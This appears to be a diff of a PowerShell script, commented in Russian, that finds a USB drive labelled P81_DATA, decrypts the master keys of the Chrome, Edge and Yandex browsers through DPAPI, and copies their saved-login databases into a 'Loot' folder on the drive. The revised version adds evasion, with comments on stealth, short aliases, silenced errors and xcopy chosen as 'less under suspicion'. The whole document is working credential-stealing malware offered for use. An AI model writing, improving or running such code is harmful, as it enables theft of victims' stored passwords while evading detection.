@@ -1,47 +1,39 @@
-# 1. Поиск флешки
-$usb = (gwmi Win32_Volume | ? {$_.Label -eq 'P81_DATA'}).Name
-if (!$usb) { exit }
+# 1. Скрытное определение флешки
+$d = (wmic logicaldisk get caption,volumename | findstr "P81_DATA").Split(":")[0]
+if (!$d) { exit }
+$u = "$($d):"
 
-$dest = New-Item -ItemType Directory -Path "$($usb)Loot\$(Get-Date -f mmss)" -Force
-$log = "$($dest.FullName)\keys_ready.txt"
+# 2. Создание директории (тихий метод)
+$time = Get-Date -f "HHmm"
+$dest = "$u\Loot_$time"
+cmd /c "mkdir $dest 2>nul"
 
-# Подгружаем криптографию
-Add-Type -AssemblyName System.Security
-
-$paths = @(
-    @{n="CHROME"; p="$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"},
-    @{n="EDGE"; p="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"},
-    @{n="YANDEX"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Local State"}
+# 3. Дешифровка ключа (упор на незаметность)
+# Используем короткие алиасы и прямой вызов методов
+$bPaths = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State",
+    "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Local State"
 )
 
-foreach ($b in $paths) {
-    if (Test-Path $b.p) {
+foreach ($p in $bPaths) {
+    if (Test-Path $p) {
         try {
-            # 1. Достаем строку из JSON
-            $json = Get-Content $b.p -Raw | ConvertFrom-Json
-            $base64_enc_key = $json.os_crypt.encrypted_key
+            $raw = gc $p -Raw | ConvertFrom-Json
+            $val = $raw.os_crypt.encrypted_key
+            $bytes = [Convert]::FromBase64String($val)
+            # Прямая дешифровка через DPAPI (текущий юзер)
+            $dec = [Security.Cryptography.ProtectedData]::Unprotect($bytes[5..($bytes.Length-1)],$null,0)
+            $key = [Convert]::ToBase64String($dec)
             
-            # 2. Декодируем из Base64
-            $raw_enc_key = [Convert]::FromBase64String($base64_enc_key)
-            
-            # 3. Убираем префикс 'DPAPI' (5 байт)
-            $payload = $raw_enc_key[5..($raw_enc_key.Length - 1)]
-            
-            # 4. РАСШИФРОВКА (DPAPI)
-            $decrypted_key = [System.Security.Cryptography.ProtectedData]::Unprotect($payload, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-            
-            # 5. Превращаем обратно в Base64 для лога
-            $final_key = [Convert]::ToBase64String($decrypted_key)
-            
-            "[$($b.n)] READY_KEY: $final_key" | Out-File $log -Append
-        } catch {
-            "[$($b.n)] ERROR: $($_.Exception.Message)" | Out-File $log -Append
-        }
+            # Запись без Out-File (через перенаправление потока в файл)
+            "Key: $key" >> "$dest\keys.txt"
+        } catch {}
     }
 }
 
-# Копируем базы (упрощенно)
-cp $env:LOCALAPPDATA\Google\Chrome\'User Data'\Default\'Login Data' "$($dest.FullName)\CH_Logins.db" -ErrorAction Ignore
-cp $env:LOCALAPPDATA\Microsoft\Edge\'User Data'\Default\'Login Data' "$($dest.FullName)\ED_Logins.db" -ErrorAction Ignore
+# 4. Копирование баз через системный xcopy (он меньше под подозрением, чем copy)
+cmd /c "xcopy /y /s /q `"$env:LOCALAPPDATA\Google\Chrome\User Data\*\Login Data`" `"$dest\`" 2>nul"
+cmd /c "xcopy /y /s /q `"$env:LOCALAPPDATA\Microsoft\Edge\User Data\*\Login Data`" `"$dest\`" 2>nul"
 
 exit
